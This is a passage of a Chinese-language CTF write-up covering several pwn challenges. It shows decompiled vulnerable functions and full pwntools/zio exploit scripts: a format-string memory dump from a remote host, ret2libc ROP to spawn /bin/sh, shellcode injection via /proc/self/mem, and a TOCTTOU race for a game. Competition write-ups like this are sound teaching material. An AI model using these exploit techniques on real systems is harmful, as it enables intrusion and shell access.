class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">        payload = <span class="string">&#x27;%14$s&#x27;</span> +<span class="string">&#x27;STA&#x27;</span>+p32(addr)</span><br><span class="line">        <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        io.recvuntil(<span class="string">&#x27;请重新初始化反应。\n&#x27;</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">&#x27;STA&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        log.info(<span class="string">&#x27;data:&#x27;</span>+data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbinary</span>():</span><br><span class="line">    addr = <span class="number">0x8048000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x8049000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.70.11&#x27;</span>,<span class="number">30002</span>)</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>然而，很多很快做出来的队伍都是看图得到的结论:<br>CH3CONH理想浓度0x2223322，地址0x804ff78，催化失败应该调整为理想浓度，摧化成成果，于是格式化字符串修改之，从而顺利拿到flag….</p>
<h2 id="HMI流水灯运行"><a href="#HMI流水灯运行" class="headerlink" title="HMI流水灯运行"></a>HMI流水灯运行</h2><p>32bit程序，开启NX，题目中存在简单的栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">gee</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*...........................................................&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是在这个过程中通过signal设置了alarm(2)后程序进入死循环</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">2</span> &amp;&amp; k == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">signal</span>(<span class="number">14</span>, handler);</span><br><span class="line">    <span class="built_in">alarm</span>(<span class="number">2u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可能Rop时间不够，所以Rop时先设置alarm，从而打断之前<code>alarm(2)</code>的设置，再ROP<br>题目的libc可通过libcdatabase查询到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#sleep(73)</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span></span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;alarm&#x27;</span>])+p32(<span class="number">0x08048469</span>)+p32(<span class="number">0x10000</span>)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0x080488A8</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">    <span class="comment">#gdb.attach(io,&#x27;b *0x80488A8&#x27;)</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;binsh_addr:&#x27;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span></span><br><span class="line">    payload1 += p32(system_addr)+p32(<span class="number">0x080488A8</span>)+p32(binsh_addr)</span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.binary = <span class="string">&quot;./stack&quot;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>

<h2 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h2><p>本以为应该是比较棘手的题目</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  workspace file fileManager</span><br><span class="line">fileManager: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=93615ea271d45b23c3abf39e55cdeb7c2746c1f0, not stripped</span><br><span class="line">➜  workspace checksec fileManager</span><br><span class="line">[*] <span class="string">&#x27;/Users/apple/Binary/CTF/2018/cyber2018/Pwn/file/workspace/fileManager&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>可是题目提供了对任意文件读写的能力，而且没有做沙箱的限制，我们能够通过目录操作读写任意文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">read_file</span><span class="params">()</span></span>&#123;<span class="comment">//任意读文件</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;模块名称:&quot;</span>);</span><br><span class="line">  <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;file, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(&amp;file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;查找模块偏移量:&quot;</span>);</span><br><span class="line">    offset = <span class="built_in">read_ul</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> ( nbytes = <span class="number">-1</span>; nbytes &lt; <span class="number">0</span> || nbytes &gt; <span class="number">256</span>; nbytes = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;模块读取大小:&quot;</span>);</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x120u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模块内容&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;s, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">write_file</span><span class="params">()</span></span>&#123;<span class="comment">//任意写文件</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;模块名称:&quot;</span>);</span><br><span class="line">  <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;file, <span class="number">64</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(&amp;file, <span class="number">0x41</span>, <span class="number">0x1B6</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ( offset = <span class="number">-1</span>; offset &lt; <span class="number">0</span>; offset = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;写入模块偏移量:&quot;</span>);</span><br><span class="line">    <span class="built_in">lseek</span>(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">-1</span>; n &lt; <span class="number">0</span> || n &gt; <span class="number">256</span>; n = <span class="built_in">read_int</span>() )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;模块写入大小:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写入模块:&quot;</span>);</span><br><span class="line">    <span class="built_in">read_buff</span>((<span class="type">int</span>)&amp;s, n, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd, &amp;s, n);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tip在于procfs <a target="_blank" rel="noopener" href="http://tacxingxing.com/2018/01/19/procfs/">Proc File System</a><br>我们可以通过读&#x2F;proc&#x2F;self&#x2F;maps来泄露程序基地址，Bypass PIE<br>之后通过写&#x2F;proc&#x2F;self&#x2F;mem来注入shellcode，通过程序流程执行shellcode，拿到Shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">Name,Offset,Length</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;3. 退出\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块名称:&#x27;</span>,Name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;查找模块偏移量:&#x27;</span>,<span class="built_in">str</span>(Offset))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块读取大小:&#x27;</span>,<span class="built_in">str</span>(Length))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;模块内容&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">Name,Offset,Length,Content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;3. 退出\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块名称:&#x27;</span>,Name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;写入模块偏移量:&#x27;</span>,<span class="built_in">str</span>(Offset))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;模块写入大小:&#x27;</span>,<span class="built_in">str</span>(Length))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;写入模块:&#x27;</span>,Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;请登录FTP:&#x27;</span>,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    read(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    proc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">    </span><br><span class="line">    address = proc_base+<span class="number">0x1154</span></span><br><span class="line">    shellcode = asm(shellcraft.linux.sh())</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    write(<span class="string">&#x27;/proc/self/mem&#x27;</span>,address,<span class="number">0x100</span>,shellcode)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.binary = <span class="string">&quot;./fileManager&quot;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./fileManager&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./fileManager&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>
<h2 id="黑客游戏"><a href="#黑客游戏" class="headerlink" title="黑客游戏"></a>黑客游戏</h2><p>题目是一个游戏，描述的Hero与Master战斗的游戏<br>通过名称容易发现有一个简单的栈溢出漏洞</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">attack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    .......</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0</span> )                            <span class="comment">// monster血量达到下限，胜利</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you win&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)gMonster == <span class="number">3</span> )             <span class="comment">//杀死level3的maseter</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;we will remember you forever!&quot;</span>);</span><br><span class="line">      <span class="built_in">vul_func</span>();</span><br><span class="line">      <span class="built_in">release_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vul_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;ok! %s ,welcome\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的在于打败level0-level4的master，从而进入函数中做ROP</p>
<p>打败怪兽无非就是自己攻击力高，或者回复血量快<br>首先同一个等级下hero的血量上限低于master</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">recovery_hp</span>((<span class="type">int</span>)gHero, <span class="number">50</span> * (*(_DWORD *)gHero + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">recovery_hp</span>(gMonster, <span class="number">70</span> * (*(_DWORD *)gMonster + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>并且在attack过程中，约定hero与master都有一个attack和defense<br>如果$hero_attack&gt;master_defense，master-&#x3D;hero_attack-master_defense$<br>否则$master_attack&gt;hero_defense，hero-&#x3D;master_attack-hero_defense$<br>这个能力还可以通过相应的技能加成</p>
<p>master每死一次，就会升级一次，能力也逐渐增强，而hero可选技能，但是只能选择0-3的技能，不能选择到最Bug的DDOS “have botnet”的，所以最强的也就是Overflow Attack，能力也就能与level2的master刚一刚<br>即使我们考虑回血，hero与master回血能力相同，所以遇到level3的<br>所以，这样看下来，hero必败。</p>
<p>注意到hero的信息能够存放在文件中，下次玩的时候可直接登录，并且保存等级状态等,每次登录后都将文件mmap到了内存中:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__cdecl <span class="title">init_db</span><span class="params">(<span class="type">char</span> *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">open</span>(file, <span class="number">2</span>);</span><br><span class="line">  gfd = v1;</span><br><span class="line">  result = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000u</span>, <span class="number">3</span>, <span class="number">1</span>, v1, <span class="number">0</span>);</span><br><span class="line">  gHero = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件的实时数据mmap映射到了内存这样可能会造成Race-conditon,即文件TOCTTOU<br>我们可以通过开启两个同一个用户下的游戏，一个打怪兽，另一个不断给自己加血来赢得游戏<br>因为TOCTTOU，每次两个进程的hero的信息，血量等是同步的mmap，所以造成了游戏出现了必胜策略<br>最后进入vnln函数，做ROP getshell即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r_m1 = COLORED(RAW, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">w_m1 = COLORED(RAW, <span class="string">&quot;blue&quot;</span>)</span><br><span class="line"></span><br><span class="line">r_m2 = COLORED(RAW, <span class="string">&quot;yellow&quot;</span>)</span><br><span class="line">w_m2 = COLORED(RAW, <span class="string">&quot;red&quot;</span>)</span><br><span class="line">target = <span class="string">&#x27;./play&#x27;</span></span><br><span class="line"><span class="comment">#target=(&#x27;47.104.90.157&#x27;,30003)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">io,Username</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;login:&#x27;</span>)</span><br><span class="line">    io.writeline(<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">io</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.read_until(<span class="string">&#x27;(1:yes/0:no):&#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runaway</span>(<span class="params">io</span>):</span><br><span class="line">    io.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    </span><br><span class="line">    io1 = zio(target,timeout=<span class="number">2</span>,print_read=r_m1,print_write=w_m1)</span><br><span class="line">    login(io1,<span class="string">&#x27;xingxing&#x27;</span>)</span><br><span class="line">    <span class="comment">#change methods =&gt; overflow attack</span></span><br><span class="line">    io1.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io1.writeline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io1.read_until(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    